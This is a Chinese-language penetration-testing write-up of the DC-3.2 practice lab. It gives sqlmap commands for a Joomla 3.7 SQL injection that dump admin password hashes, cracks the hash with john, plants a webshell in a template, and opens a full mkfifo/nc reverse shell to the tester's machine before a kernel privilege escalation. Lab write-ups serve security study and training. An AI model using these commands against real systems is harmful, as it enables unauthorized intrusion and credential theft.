---
title: "DC-3渗透笔记"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# DC-3.2渗透笔记

### 信息搜集

#### IP探测

![image-20240719222612552](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222613779-2127021338.png)

#### 端口探测

![image-20240719222808591](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222809211-1287523617.png)

发现只有80端口开启，那就直接看看web服务

#### 网页信息搜集

![image-20240719222934704](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719222935277-1864423034.png)

这里最重要的信息就是这个cms模板是joomla

扫一下目录：

![image-20240719223357055](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719223358196-893440691.png)

可以发现/administrator/是后台：

![image-20240719224120841](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719224121795-503912048.png)

在README.txt中记录了版本号为3.7

![image-20240719223918908](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719223919517-470503049.png)

查一下有没有漏洞：

![image-20240719224330088](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719224330563-745610616.png)

ok存在sql注入，准备利用

### 漏洞利用

#### SQL注入

##### 方法一：sqlmap

看看漏洞细节描述：

![image-20240719225234632](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719225235892-731594601.png)

还是个CVE，这里连sqlmap的命令都给出来了，直接跑一手sqlmap

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719231458361-308146630.png" alt="image-20240719231457682" style="zoom:150%;" />

跑出来5个数据库，再按常规流程梭一下：

* 爆当前库名：

  ~~~shell
  sqlmap -u "http://192.168.40.159/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --current-db
  ~~~

  ![image-20240719231658067](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719231658621-171644524.png)

  库名为joomladb

* 爆表名：

  ~~~shell
  sqlmap -u "http://192.168.111.191/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables
  ~~~

  

  ![image-20240719232001836](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719232002530-1813592869.png)

  一共76张表，#__users 这个表一看就很有用，看看

* 爆列名：

  ~~~shell
  sqlmap -u "http://192.168.111.191/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns
  ~~~

  ![image-20240719233206369](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719233206908-110360921.png)

* 接下来爆username和password字段：

  ~~~shell
  sqlmap -u "http://192.168.111.191/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 -p list[fullordering] -D "joomladb" --tables -T "#__users" --columns -C "username,password" --dump
  ~~~

  ![image-20240719234259313](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240719234300072-1065656106.png)

  拿到了admin的密码哈希

##### 方法二：漏洞库脚本

当然，我们在搜索漏洞的时候看见还有个php脚本，试试能不能梭哈：

把这个php文件cp到web目录然后解析：

![image-20240720011044111](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720011045096-1211650473.png)

访问网页，填好目标url即可一把梭：

![image-20240720011805962](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720011806909-448180195.png)

#### 密码哈希破解

用john来破解一手，把哈希写进adminpass然后用rockyou字典爆破：

~~~shell
john adminpass --wordlist=/usr/share/wordlists/rockyou.txt
~~~

![image-20240720001631900](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720001632968-2029156821.png)

得到明文密码snoopy，可以进入后台看看了

#### 后台getshell

在后台肯定是找能够编辑php文件的地方了，而这里的模板里可以新建php文件：

![image-20240720002543813](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720002544800-1726038183.png)

我们写一个webshell代码进去，这里我在beez3里面试了很久，新建文件和写入现有文件没有连上，最后将webshell写在protostar的index.php里连上了：

![image-20240720012828236](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720012829296-1564565184.png)

蚁剑连接：

![image-20240720013026081](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720013026521-408314513.png)

接下来反弹shell:

![image-20240720014128065](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720014128894-832196690.png)

由于这里nc没有e选项，所以我换了个命令：

~~~shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.111.132 4444 >/tmp/f
~~~

![image-20240720014243245](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720014243550-1872525799.png)

成功上线kali，接下来进入提权阶段

### 权限提升

看看系统内核：

~~~shell
uname -a
~~~

查看Ubantu发行版本

~~~shell
lsb_release -a
~~~

![image-20240720020207491](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720020208492-105252062.png)

可知系统是ubuntu 16.04

搜一下看看有没有洞：

![image-20240720020509033](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720020509802-1445743198.png)

ok有权限提升，看看描述：

![image-20240720021209388](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720021210277-1850383652.png)

这里给出了利用脚本的下载地址（proof of concept）

在靶机上下载：

![image-20240720021311824](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720021312647-423033446.png)

接下来解压并进入该目录：

![image-20240720021411699](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720021412029-1804920898.png)

解压exp并进入目录：

![image-20240720021649930](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720021650302-666495811.png)

接下来按照漏洞描述文本中给出的命令进行执行，描述如下：

![image-20240720021831945](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720021832635-91737880.png)

直接照着打一遍：

![image-20240720022129350](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720022130216-44502554.png)

成功提权到root，太丑了拿个pty先：

![image-20240720022510736](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720022511288-1969513241.png)

接下来在/root中拿flag：

![image-20240720022541750](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240720022542348-36376853.png)

### 总结

这次渗透过程，有如下漏洞或利用：

* 该joomla版本存在sql注入历史漏洞
* 获得admin的密码哈希后，使用john进行爆破获取了明文密码
* joomla后台存在模板编辑，可以在模板文件中写入webshell上线
* 该主机得操作系统ubuntu 16.04存在内核漏洞，导致权限提升